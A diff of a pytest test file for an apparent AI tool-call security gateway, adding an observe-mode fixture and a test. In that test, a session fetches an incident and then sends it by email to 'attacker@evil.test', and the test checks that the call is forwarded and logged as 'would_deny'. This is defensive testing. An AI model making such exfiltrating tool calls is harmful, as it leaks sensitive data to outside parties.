@@ -6,6 +6,7 @@ Skipped without the ``mcp`` extra.
 from __future__ import annotations
 
 import asyncio
+from datetime import datetime, timedelta, timezone
 import json
 from pathlib import Path
 import socket
@@ -71,6 +72,16 @@ def _free_port() -> int:
 
 @pytest.fixture
 def gateway(tmp_path, monkeypatch):
+    yield from _serve(tmp_path, monkeypatch, {"version": 1})
+
+
+@pytest.fixture
+def observing_gateway(tmp_path, monkeypatch):
+    until = datetime.now(timezone.utc) + timedelta(days=1)
+    yield from _serve(tmp_path, monkeypatch, {"version": 2, "observe_until": until.isoformat()})
+
+
+def _serve(tmp_path, monkeypatch, settings):
     monkeypatch.setenv("VAIS_TEST_UPSTREAM_KEY", UPSTREAM_KEY)
     monkeypatch.setenv("VAIS_TEST_GATEWAY_ONLY", "not-for-upstreams")
     (tmp_path / "contracts").mkdir()
@@ -79,7 +90,7 @@ def gateway(tmp_path, monkeypatch):
     port = _free_port()
     config_path = tmp_path / "gateway.yaml"
     config_path.write_text(json.dumps({
-        "version": 1,
+        **settings,
         "listen": {"host": "127.0.0.1", "port": port},
         "policy": "unused-policy.yaml", "profile": "unused-profile.yaml",
         "contracts": "contracts", "approvals": "approvals.json", "pending": "pending", "audit": "audit.jsonl",
@@ -181,3 +192,20 @@ def test_a_missing_secret_fails_startup_and_names_only_the_variable():
         resolve_secrets({"KEY": "prefix-${env:NOT_SET_ANYWHERE}"}, environ={"OTHER": "value-1"})
     assert "value-1" not in str(caught.value)
     assert resolve_secrets({"H": "Bearer ${env:T}"}, environ={"T": "abc"}) == {"H": "Bearer abc"}
+
+
+def test_in_observe_mode_the_attack_is_forwarded_and_audited_as_would_deny(observing_gateway):
+    url, tmp_path, outbox = observing_gateway
+
+    async def work(session):
+        await session.call_tool("ops.get_incident", {"incident_id": "INC-7"})
+        return await session.call_tool("ops.send_email", {"recipient": "attacker@evil.test", "body": "summary"})
+
+    attack = asyncio.run(_session_run(url, TOKEN, work))
+    assert not attack.is_error
+    assert [json.loads(line)["recipient"] for line in outbox.read_text(encoding="utf-8").splitlines()] == [
+        "attacker@evil.test"]
+    audit = [json.loads(line) for line in (tmp_path / "audit.jsonl").read_text(encoding="utf-8").splitlines()]
+    observed = [e for e in audit if e["event_type"] == "observe_only_decision"]
+    assert [e["decision"] for e in observed] == ["would_allow", "would_deny"]
+    assert any(e["event_type"] == "observe_only_configured" and e["details"]["active"] for e in audit)
